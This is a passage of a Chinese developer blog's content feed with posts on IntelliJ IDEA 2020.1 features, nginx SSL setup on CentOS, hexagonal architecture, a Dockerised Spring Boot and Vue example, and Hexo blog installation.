&amp;&amp;</span></span><br><span class="line"><span class="string">                Objects.equals(detail, logRecord.detail);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    @Override</span></span><br><span class="line"><span class="string">    public int hashCode() &#123;</span></span><br><span class="line"><span class="string">        return Objects.hash(id, date, detail);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><br>Java 14认为上面这种final类型class的定义的套路是完全固定的，写了很多固定套路的代码，包括：构造函数、Getter方法、toString()方法、hashCode() 和 equals()方法等等，十分无聊。</p><p>为此Java 14推出了全新的record语法，只需一行代码即可搞定，十分方便：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">record LogRecord( int id, LocalDate date, String detail ) &#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这次IDEA 2020中就已经完全支持recod语法了，并且还可以自动显式地为record生成各种方法：<br><img src="/img/IDEA2020/IDEA2020_20.jpg" alt=""></p><h2 id="支持更加智能的检查和重构"><a href="#支持更加智能的检查和重构" class="headerlink" title="支持更加智能的检查和重构"></a>支持更加智能的检查和重构</h2><h3 id="1、支持就地更改方法签名"><a href="#1、支持就地更改方法签名" class="headerlink" title="1、支持就地更改方法签名"></a>1、支持就地更改方法签名</h3><p>什么意思呢？举个例子。</p><p>当你想直接修改某个已有方法的参数时，不管三七二十一，上来可以直接修改方法签名，然后点击更新，接下来的所有步骤IDEA可以帮你完成。<br><img src="/img/IDEA2020/IDEA2020_21.jpg" alt=""><br><img src="/img/IDEA2020/IDEA2020_22.jpg" alt=""><br><img src="/img/IDEA2020/IDEA2020_23.jpg" alt=""><br><img src="/img/IDEA2020/IDEA2020_24.jpg" alt=""></p><p>2、智能分析日期字符串格式</p><p>比如这个例子中，我格式化一个日期时，无意将年月日<code>yyyy/MM/dd</code>字符串写成了<code>yyyy/mm/dd</code>，中间的<code>MM</code>大小写忘了，IDEA自动给我们分析出来了：<br><img src="/img/IDEA2020/IDEA2020_25.jpg" alt=""></p><p>3、智能语法和拼写检查器</p><p>这个功能得配合<code>Grazie</code>这个插件一起使用，该插件是一个全面的语法、拼写、以及样式检查工具。</p><p>比如，这地方我小手一抖，写错了英语语法，它立马帮我们提示出来了<br><img src="/img/IDEA2020/IDEA2020_26.jpg" alt=""></p><h2 id="增强调试功能"><a href="#增强调试功能" class="headerlink" title="增强调试功能"></a>增强调试功能</h2><h3 id="1、数据流分析辅助，可以直接预测下面的运行结果"><a href="#1、数据流分析辅助，可以直接预测下面的运行结果" class="headerlink" title="1、数据流分析辅助，可以直接预测下面的运行结果"></a>1、数据流分析辅助，可以直接预测下面的运行结果</h3><p>IDEA 2020.1直接将数据流分析添加到JVM调试器。当程序在断点处停止时，IDEA可以根据程序的当前状态运行数据流分析，来预测下一步将要发生什么。<br><img src="/img/IDEA2020/IDEA2020_27.jpg" alt=""></p><h3 id="2、调试时，支持固定对象字段"><a href="#2、调试时，支持固定对象字段" class="headerlink" title="2、调试时，支持固定对象字段"></a>2、调试时，支持固定对象字段</h3><p>当一个对象字段过多，以致于调试时很难找到需要的字段时，我们可以直接将其置顶，便于查看。<br><img src="/img/IDEA2020/IDEA2020_28.jpg" alt=""></p><h3 id="3、以文件形式存储运行配置"><a href="#3、以文件形式存储运行配置" class="headerlink" title="3、以文件形式存储运行配置"></a>3、以文件形式存储运行配置</h3><p>新版IDEA支持直接将当前的调试/运行的配置存档，并在以后选择重新加载<br><img src="/img/IDEA2020/IDEA2020_29.jpg" alt=""></p><h2 id="更加先进的版本控制"><a href="#更加先进的版本控制" class="headerlink" title="更加先进的版本控制"></a>更加先进的版本控制</h2><p>第一个大的改进就是重新设计了代码提交的窗口，而不再是以前老的那种模态化弹窗式窗口了。这样一来，提交代码时的代码比对，编辑会更加舒适。<br><img src="/img/IDEA2020/IDEA2020_30.jpg" alt=""></p><p>第二个改进就是支持搜索、刷新本地以及远端的代码分支：<br><img src="/img/IDEA2020/IDEA2020_31.jpg" alt=""><br>另外，这个历史日志留痕也是蛮好看的：<br><img src="/img/IDEA2020/IDEA2020_32.jpg" alt=""></p><h2 id="Maven和Gradle导入更新"><a href="#Maven和Gradle导入更新" class="headerlink" title="Maven和Gradle导入更新"></a>Maven和Gradle导入更新</h2><p>此处就以Maven工具为例，编辑器右上角出现的是一个浮动通知。修改构建文件后，可以使用这个迷你的通知图标来加载更改<br><img src="/img/IDEA2020/IDEA2020_33.jpg" alt=""></p><h2 id="数据库处理增强"><a href="#数据库处理增强" class="headerlink" title="数据库处理增强"></a>数据库处理增强</h2><p>新版IDEA内置的数据库管理，现在可以支持将数据导出到Excel（.xlsx）文件，并且直接在编辑器中以文本形式查看<br><img src="/img/IDEA2020/IDEA2020_34.jpg" alt=""></p><h2 id="增强的HTTP-Client"><a href="#增强的HTTP-Client" class="headerlink" title="增强的HTTP Client"></a>增强的HTTP Client</h2><p>升级之后的<code>HTTP Client</code>更加智能，典型的比如：支持自动匹配和补全<br><img src="/img/IDEA2020/IDEA2020_35.jpg" alt=""><br>而且还可以在<code>Contoller</code>代码的左侧，通过快捷的方式来自动生成HTTP请求文件<br><img src="/img/IDEA2020/IDEA2020_36.jpg" alt=""><br>而且对于Spring项目，还可以在底部的<code>Endpoints</code>窗口里来快捷生成HTTP请求文件。<br><img src="/img/IDEA2020/IDEA2020_37.jpg" alt=""></p><h2 id="其他改进"><a href="#其他改进" class="headerlink" title="其他改进"></a>其他改进</h2><p>1、对各种框架的支持改进，比如：<code>Spring WebFlux/Selenium/JMS/Micronaut/RxJava</code>等等</p><p>2、对<code>Docker/Kubernetes</code>的支持改进</p><p>3、对<code>Scala 3</code>的支持</p><p>4、对<code>Android Volley</code>的支持</p><p>5、对<code>JavaScript</code>的改进和支持</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>体验一番之后发现，新版的IDEA 2020.1肉眼可见的改进还是非常多的，挺香。</p><p>不过还有一个实际的问题就是：我一升级之后发现一大票的插件都不能用了，所以周边支持的兼容性还得再等等。</p><p>本文为授权转载<br>IDEA2020新版本体验文章及视频来自个人非常喜欢的、富有经验的b站up主：<a href="https://space.bilibili.com/384068749" target="_blank" rel="noopener">程序羊</a>，<a href="https://www.codesheep.cn/" target="_blank" rel="noopener">羊哥个人博客地址</a>。<br>原文地址：<a href="https://mp.weixin.qq.com/s/Ua4TYlcNntLr-x9WQirHyg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/Ua4TYlcNntLr-x9WQirHyg</a> 视频地址：<a href="https://www.bilibili.com/video/BV1MT4y1V76k" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1MT4y1V76k</a><br>注意：部分组件周边可能还不兼容。</p>]]></content>
      
      
      <categories>
          
          <category> IDEA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IDEA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>centos安装nginx并配置SSL证书</title>
      <link href="/2020/04/05/centos%E5%AE%89%E8%A3%85nginx%E5%B9%B6%E9%85%8D%E7%BD%AESSL%E8%AF%81%E4%B9%A6/"/>
      <url>/2020/04/05/centos%E5%AE%89%E8%A3%85nginx%E5%B9%B6%E9%85%8D%E7%BD%AESSL%E8%AF%81%E4%B9%A6/</url>
      
        <content type="html"><![CDATA[<h2 id="安装nginx的命令"><a href="#安装nginx的命令" class="headerlink" title="安装nginx的命令"></a>安装nginx的命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install epel-release</span><br><span class="line">sudo yum install nginx</span><br></pre></td></tr></table></figure><h2 id="让nginx随系统启动而启动"><a href="#让nginx随系统启动而启动" class="headerlink" title="让nginx随系统启动而启动"></a>让nginx随系统启动而启动</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl <span class="built_in">enable</span> nginx</span><br></pre></td></tr></table></figure><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">启动：nginx</span><br><span class="line">停止：nginx -s stop</span><br><span class="line">重载配置：nginx -s reload</span><br></pre></td></tr></table></figure><h2 id="配置SSL证书"><a href="#配置SSL证书" class="headerlink" title="配置SSL证书"></a>配置SSL证书</h2><p>配置路径：/etc/nginx/<br>日志路径：/var/log/nginx<br>打开配置文件<br>在HTTP节点下配置两个server节点，其他不变<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">server </span><br><span class="line">&#123;</span><br><span class="line">listen 443;</span><br><span class="line">server_name your-domain.com www.your-domain.com;</span><br><span class="line">ssl on;</span><br><span class="line">ssl_certificate  /root/ssl/your-domain.crt;</span><br><span class="line">ssl_certificate_key /root/ssl/your-domain.key;</span><br><span class="line">ssl_session_timeout 5m;</span><br><span class="line">ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4;</span><br><span class="line">ssl_protocols TLSv1 TLSv1.1 TLSv1.2;</span><br><span class="line">ssl_prefer_server_ciphers on;</span><br><span class="line">location / &#123;</span><br><span class="line">proxy_buffer_size  128k;</span><br><span class="line">proxy_buffers   32 32k;</span><br><span class="line">proxy_busy_buffers_size 128k;</span><br><span class="line">proxy_pass http://127.0.0.1:912;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">server</span><br><span class="line">&#123;</span><br><span class="line">listen 80;</span><br><span class="line">server_name your-domain.com www.your-domain.com;</span><br><span class="line">   rewrite ^(.*)$ https://<span class="variable">$host</span><span class="variable">$1</span> permanent;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>配置注意：</p><ul><li>your-domain.com替换成你自己的域名</li><li>your-domain.crt和your-domain.key是你的证书文件，换成你自己的证书文件路径(从购买域名地址下载)</li><li>域名解析，增加两个A记录，主机名一个是www的，一个是@，记录值是你服务器的IP地址,详细步骤可以看我的博文-hexo博客</li><li>配置完成之后要重新加载nginx：nginx -s reload</li></ul>]]></content>
      
      
      <categories>
          
          <category> centos </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nginx </tag>
            
            <tag> centos </tag>
            
            <tag> SSL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>六边形架构认识</title>
      <link href="/2020/03/01/%E5%85%AD%E8%BE%B9%E5%BD%A2%E6%9E%B6%E6%9E%84/"/>
      <url>/2020/03/01/%E5%85%AD%E8%BE%B9%E5%BD%A2%E6%9E%B6%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<h2 id="六边形架构简介"><a href="#六边形架构简介" class="headerlink" title="六边形架构简介"></a>六边形架构简介</h2><p>六边形架构由Alistair Cockburn于2005年提出，相较于传统三层架构方式的缺点————不支持多客户端、不支持多数据库、领域层依赖持久层，六边形架构实现了业务逻辑以一种松耦合的形式与多个外部系统通过“适配器-端口”的形式进行集成。某种意义上六边形架构也是一种分层架构，将架构分为了内部和外部但没有了层的概念。六边形架构也称为端口与适配器，在领域驱动设计（DDD）和微服务架构中都出现了六边形架构的身影。</p><h2 id="六边形架构结构"><a href="#六边形架构结构" class="headerlink" title="六边形架构结构"></a>六边形架构结构</h2><p>六边形架构的六边并不重要，六边只是为了留足空间放置端口和适配器以及用六边形接入多个外部系统视觉上最简洁美观。六边形架构创造者AlistairCockburn最初以六边形来表示这种架构后沿用至今。六边形架构的主要特点是多个适配器和端口形成的划分为内部、外部的架构模式。业务逻辑层可以接入所有满足端口需求的表示层(应用前端、页面)与持久层(数据库)。这种情形可以类比理解java中接口与接口的实现类，所有有满足接口所有方法的类都可以实现接口。<br><img src="/img/六边形架构.png" alt="六边形架构alt"><br>上图六边形架构结构图，其中黑箭头为调用关系，白箭头为实现关系。右侧Message为相关消息机制，多用于微服务架构中多个微服务(六边形架构)之间通信，本文不做太多讨论。<br>由上图可以发现六边形架构的内部(业务逻辑)与外部(APP,WEB,数据库等)完全隔离，只通过adapter适配器进行交互实现了业务逻辑层与持久层的完全解耦，更一步实现“高内聚低耦合”</p><h2 id="各部分解读"><a href="#各部分解读" class="headerlink" title="各部分解读"></a>各部分解读</h2><ul><li><p>输入端口：<br>用于系统提供服务时暴露API接口，接受外部（前端UI界面、其它微服务）的输入。系统作为服务提供者是对外的接入层可以看成是输入端口。</p></li><li><p>输出端口：<br>为系统获取外部服务提供支持，如获取持久化状态、对结果进行持久化(要求对数据库增删改查操作的接口)。</p></li><li><p>业务逻辑：<br>系统服务的实体类，微服务设计中根据用例、服务复杂程度将大项目(服务)划分为多个小团队可处理的小服务重要参照。</p></li></ul><h2 id="软件开发设计"><a href="#软件开发设计" class="headerlink" title="软件开发设计"></a>软件开发设计</h2><p>规范化六边形架构可以如下图所示<br>其中adapter包下为入站、出站适配器，application包下为入站、出站端口其中BookApplicationService为入站端口BookUaseCase接口的实现类，domin包下为业务逻辑层book为实体类。adapter包下JpaBookRepository接口为出站端口BookRepository接口的继承并具备接口的默认实现方法(jdk8特性)。<br><img src="/img/六边形架构开发实例.PNG" alt="六边形架构开发实例"></p>]]></content>
      
      
      <categories>
          
          <category> 架构模式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 架构模式 </tag>
            
            <tag> 六边形架构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker容器运行前后端分离简单实例</title>
      <link href="/2020/02/25/docker%E5%AE%B9%E5%99%A8%E8%BF%90%E8%A1%8C%E7%AE%80%E5%8D%95%E5%89%8D%E5%90%8E%E7%AB%AF%E7%BB%93%E5%90%88%E5%AE%9E%E4%BE%8B/"/>
      <url>/2020/02/25/docker%E5%AE%B9%E5%99%A8%E8%BF%90%E8%A1%8C%E7%AE%80%E5%8D%95%E5%89%8D%E5%90%8E%E7%AB%AF%E7%BB%93%E5%90%88%E5%AE%9E%E4%BE%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><h3 id="Docker简介"><a href="#Docker简介" class="headerlink" title="Docker简介"></a>Docker简介</h3><p>Docker是一种运行于Linux和Windows上的软件，用于创建、管理和编排容器。Docker是在GitHub上开发的Moby开源项目的一部分。<a href="https://docs.docker.com/" target="_blank" rel="noopener">Docker官方文档</a> <a href="http://www.docker.org.cn/page/resources.html" target="_blank" rel="noopener">Docker中文社区</a>(ps:别忘配置加速器Docker图标》Settings》Docker Engine)</p><h2 id="后端代码"><a href="#后端代码" class="headerlink" title="后端代码"></a>后端代码</h2><p>springboot项目，非常简单的演示后端，注解代码实现获取/hello/路径后的string类型数据。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">package iteach.docker.service.spring.docker;</span><br><span class="line"></span><br><span class="line">import org.springframework.boot.SpringApplication;</span><br><span class="line">import org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line">import org.springframework.web.bind.annotation.CrossOrigin;</span><br><span class="line">import org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line">import org.springframework.web.bind.annotation.PathVariable;</span><br><span class="line">import org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line">@RestController</span><br><span class="line">@SpringBootApplication</span><br><span class="line">public class SpringHelloApplication &#123;</span><br><span class="line"></span><br><span class="line">    @CrossOrigin</span><br><span class="line">    @GetMapping(<span class="string">"/hello/&#123;name&#125;"</span>)</span><br><span class="line">    public String hello(@PathVariable String name) &#123;</span><br><span class="line">        <span class="built_in">return</span> String.format(<span class="string">"Hello,%s!"</span>, name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        SpringApplication.run(SpringHelloApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="Docker与后端应用"><a href="#Docker与后端应用" class="headerlink" title="Docker与后端应用"></a>Docker与后端应用</h2><h3 id="Docker创建后端镜像"><a href="#Docker创建后端镜像" class="headerlink" title="Docker创建后端镜像"></a>Docker创建后端镜像</h3><p>1、将后端项目打成jar包，可以在命令行工具（这里使用的是powershell）进入到jar包生成路径运行java -jar .\jar包名.jar\检验jar包是否能运行<br>2、新建一个文件夹，文件夹下放置jar包和新建一个名为Dockerfile的文件不可改名。<br>3、Dockerfile内容,可以将jdk改为jre这样安装的镜像更小更快<br><img src="/img/backend.png" alt="运行结果"><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FROM openjdk:11</span><br><span class="line">ADD spring-hello.jar app.jar</span><br><span class="line">ENTRYPOINT [<span class="string">"java"</span>,<span class="string">"-jar"</span>,<span class="string">"app.jar"</span>]</span><br></pre></td></tr></table></figure><br>4、命令行工具在该目录下输入(文章最后总结解释各个指令作用)<br>拉取镜像(在放置Dockerfile文件处执行)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t spring-hello .</span><br></pre></td></tr></table></figure></p><h3 id="Docker创建容器并运行"><a href="#Docker创建容器并运行" class="headerlink" title="Docker创建容器并运行"></a>Docker创建容器并运行</h3><p>命令行工具输入，创建容器运行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name hello-backend -d -p 8000:8080 spring-hello</span><br></pre></td></tr></table></figure><br>获取运行结果<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-RestMethod http://localhost:8000/hello/xz</span><br></pre></td></tr></table></figure><br><img src="/img/backend2.png" alt="运行结果">  </p><h2 id="前端代码"><a href="#前端代码" class="headerlink" title="前端代码"></a>前端代码</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;div id=<span class="string">"app"</span>&gt;</span><br><span class="line">&lt;div id=<span class="string">"sender"</span>&gt;</span><br><span class="line">&lt;input <span class="built_in">type</span>=<span class="string">"text"</span> v-model=<span class="string">"name"</span> /&gt;</span><br><span class="line">&lt;button @click=<span class="string">"send"</span>&gt;发送&lt;/button&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div id=<span class="string">"greeting"</span>&gt;</span><br><span class="line">&lt;p style=<span class="string">"margin-bottom: 0;"</span>&gt;Vue: &#123;&#123; name &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;p style=<span class="string">"margin-top: 0;"</span>&gt;Spring: &#123;&#123; greeting &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="built_in">export</span> default &#123; name: <span class="string">"App"</span>,</span><br><span class="line"><span class="function"><span class="title">data</span></span>() &#123; <span class="built_in">return</span> &#123;</span><br><span class="line">name: <span class="string">""</span>, greeting: <span class="string">""</span></span><br><span class="line">&#125;;</span><br><span class="line">&#125;,</span><br><span class="line">methods: &#123;</span><br><span class="line"><span class="function"><span class="title">send</span></span>() &#123; // Axios Promise </span><br><span class="line">fetch(`http://localhost:8000/hello/<span class="variable">$&#123;this.name&#125;</span>`)</span><br><span class="line">.<span class="keyword">then</span>(response =&gt; &#123; <span class="built_in">return</span> response.text();</span><br><span class="line">&#125;)</span><br><span class="line">.<span class="keyword">then</span>(text =&gt; (this.greeting = text))</span><br><span class="line">.catch(error =&gt; console.log(error));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="Docker与前端应用"><a href="#Docker与前端应用" class="headerlink" title="Docker与前端应用"></a>Docker与前端应用</h2><p>注意：这里演示使用的是Vue框架，文件名为hello-vue,使用服务器为nginx.</p><h3 id="Docker创建前端镜像"><a href="#Docker创建前端镜像" class="headerlink" title="Docker创建前端镜像"></a>Docker创建前端镜像</h3><p>新建Dockerfile文件，文件内容：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FROM nginx</span><br><span class="line"><span class="comment"># 更多请参考https://hub.docker.com/_/nginx/</span></span><br><span class="line">COPY ./hello /usr/share/nginx/html</span><br></pre></td></tr></table></figure></p><h3 id="Docker创建容器并运行-1"><a href="#Docker创建容器并运行-1" class="headerlink" title="Docker创建容器并运行"></a>Docker创建容器并运行</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker build -t hello-vue . </span><br><span class="line">docker run --name hello-frontend -d -p 80:80 hello-vue</span><br></pre></td></tr></table></figure><p>运行结果：<br><img src="/img/result1.png" alt="运行结果"></p><h2 id="Docker-compose一次运行两个容器"><a href="#Docker-compose一次运行两个容器" class="headerlink" title="Docker-compose一次运行两个容器"></a>Docker-compose一次运行两个容器</h2><p>避免干扰测试建议停止并删除之前运行的容器，指令行在文章末尾<br>1、命令行工具输入code docker-compose.yml 创建docker-compose文件<br>2、docker-compose.yml编译内容<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">version: <span class="string">'3'</span></span><br><span class="line">services:</span><br><span class="line">  frontend:</span><br><span class="line">    image: hello-vue</span><br><span class="line">    ports:</span><br><span class="line">    - 80:80 </span><br><span class="line">    depends_on:</span><br><span class="line">    - backend</span><br><span class="line">  backend:</span><br><span class="line">    image: spring-hello</span><br><span class="line">    ports:</span><br><span class="line">    - 8000:8080</span><br></pre></td></tr></table></figure><br>3、命令行工具输入运行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose.exe up</span><br></pre></td></tr></table></figure><br><img src="/img/image.png" alt="镜像"><br><img src="/img/container.png" alt="容器"><br>4、运行结果<br><img src="/img/result2.png" alt="运行结果"></p><h2 id="Docker基础指令"><a href="#Docker基础指令" class="headerlink" title="Docker基础指令"></a>Docker基础指令</h2><p>下面是这篇文章运用的docker指令集合方便观看<br>Docker构建镜像(spring-hello为镜像名，-t为容器重新分配一个伪输入终端)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t spring-hello .</span><br></pre></td></tr></table></figure><br>Docker运行容器(hello-backend为容器名，-d表示后台运行容器并返回容器ID，-p表示端口号，spring-hello为已搭建的镜像名)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name hello-backend -d -p 8000:8080 spring-hello</span><br></pre></td></tr></table></figure><br>显示已安装镜像<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><br>显示所有容器与显示正在运行容器<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br><span class="line">docker ps</span><br></pre></td></tr></table></figure><br>停止容器、删除容器、删除镜像<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker stop 容器名</span><br><span class="line">docker rm 容器名</span><br><span class="line">docker rmi 镜像名</span><br></pre></td></tr></table></figure><br>获取网页内容<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-RestMethod http://localhost:8000/hello/xz</span><br></pre></td></tr></table></figure><br>创建docker-compose文件与运行该文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">code docker-compose.yml</span><br><span class="line">docker-compose.exe up</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo博客配置及个人网站部署</title>
      <link href="/2019/12/25/hexo%E5%8D%9A%E5%AE%A2/"/>
      <url>/2019/12/25/hexo%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h2 id="一、Hexo"><a href="#一、Hexo" class="headerlink" title="一、Hexo"></a>一、Hexo</h2><h3 id="Hexo简介"><a href="#Hexo简介" class="headerlink" title="Hexo简介"></a>Hexo简介</h3><p><a href="https://hexo.io/zh-cn/docs/" target="_blank" rel="noopener">Hexo官方文档</a>本文简化列举Hexo框架搭建基础步骤<br>Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。</p><h3 id="Hexo安装"><a href="#Hexo安装" class="headerlink" title="Hexo安装"></a>Hexo安装</h3><p>安装前确保电脑安装了<a href="http://nodejs.org/" target="_blank" rel="noopener">Node.js</a> (Node.js 版本需不低于 8.10，建议使用 Node.js 10.0 及以上版本)和<a href="http://git-scm.com/" target="_blank" rel="noopener">Git</a></p><ul><li>必备的应用程序安装完后，鼠标右键点击Git Bash Here进行git命令行操作。<br><img src="/img/Gitbash.PNG" alt="Git Bash alt"></li><li>输入安装指令  </li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install -g hexo-cli</span><br></pre></td></tr></table></figure><h3 id="建站"><a href="#建站" class="headerlink" title="建站"></a>建站</h3><p>输入以下指令建站，folder为自定义文件名<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ hexo init &lt;folder&gt;</span><br><span class="line">$ <span class="built_in">cd</span> &lt;folder&gt;</span><br><span class="line">$ npm install</span><br></pre></td></tr></table></figure></p><h3 id="文件介绍"><a href="#文件介绍" class="headerlink" title="文件介绍"></a>文件介绍</h3><p>建站完成后生成以下文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">├── _config.yml</span><br><span class="line">├── package.json</span><br><span class="line">├── scaffolds</span><br><span class="line">├── <span class="built_in">source</span></span><br><span class="line">└── themes</span><br></pre></td></tr></table></figure></p><h3 id="各个文件作用"><a href="#各个文件作用" class="headerlink" title="各个文件作用"></a>各个文件作用</h3><ul><li>_config.yml<br>网站的配置信息，基于markdown语言，在此配置大部分的参数。</li><li>package.json<br>应用程序的信息。EJS, Stylus 和 Markdown renderer 已默认安装，可以自由移除。</li><li>scaffolds<br>模版 文件夹。当您新建文章时，Hexo 会根据 scaffold 来建立文件。<br>Hexo的模板是指在新建的markdown文件中默认填充的内容。例如，如果您修改 scaffold/post.md 中的 Front-matter 